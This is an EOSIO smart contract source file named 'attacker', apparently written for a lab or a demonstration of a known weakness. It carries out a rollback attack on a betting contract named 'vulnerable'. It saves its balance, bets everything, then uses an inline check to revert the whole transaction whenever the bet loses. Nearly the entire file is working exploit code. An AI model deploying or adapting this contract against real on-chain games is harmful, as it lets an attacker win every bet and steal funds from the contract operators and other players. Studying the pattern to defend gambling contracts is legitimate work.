#include "../eosio.token.hpp"
#include <eosio/asset.hpp>
#include <eosio/eosio.hpp>
#include <eosio/system.hpp>

using namespace eosio;
using namespace std;

static constexpr extended_symbol EOS_SYMBOL =
    extended_symbol(symbol("EOS", 4), name("eosio.token"));

class [[eosio::contract("attacker")]] attacker : public contract {
public:
  using contract::contract;
  attacker(eosio::name receiver, eosio::name code,
           eosio::datastream<const char *> ds)
      : contract(receiver, code, ds) {}

  TABLE balance {
    asset eos_balance;

    uint64_t primary_key() const { return 0; }
  };

  typedef eosio::multi_index<"balance"_n, balance> balance_t;
  balance_t balance_table = balance_t(get_self(), get_self().value);

  ACTION attack() {
    // 1. store current balance
    asset current_balance = token::get_balance(
        EOS_SYMBOL.get_contract(), get_self(), EOS_SYMBOL.get_symbol().code());
    balance_table.emplace(get_self(),
                          [&](auto &x) { x.eos_balance = current_balance; });

    // 2. do the bet which resolves in same action
    token::transfer_action transfer_act(
        EOS_SYMBOL.get_contract(),
        permission_level{get_self(), name("active")});
    transfer_act.send(get_self(), name("vulnerable"), current_balance, "");

    // 3. check if we won after the bet resolved (this inline action is executed
    // after the bet)
    checkwin_action checkwin_act(get_self(),
                                 permission_level{get_self(), name("active")});
    checkwin_act.send();
  }

  ACTION checkwin() {
    // 4. revert whole transaction if we lost
    auto current_balance = token::get_balance(
        EOS_SYMBOL.get_contract(), get_self(), EOS_SYMBOL.get_symbol().code());
    auto previous_balance_itr = balance_table.require_find(0, "prev balance not found");
    print(previous_balance_itr->eos_balance, "\n");
    print(current_balance, "\n");
    check(previous_balance_itr->eos_balance.amount < current_balance.amount, "would have lost");

    balance_table.erase(previous_balance_itr);
  }

  using checkwin_action =
      eosio::action_wrapper<"checkwin"_n, &attacker::checkwin>;
};
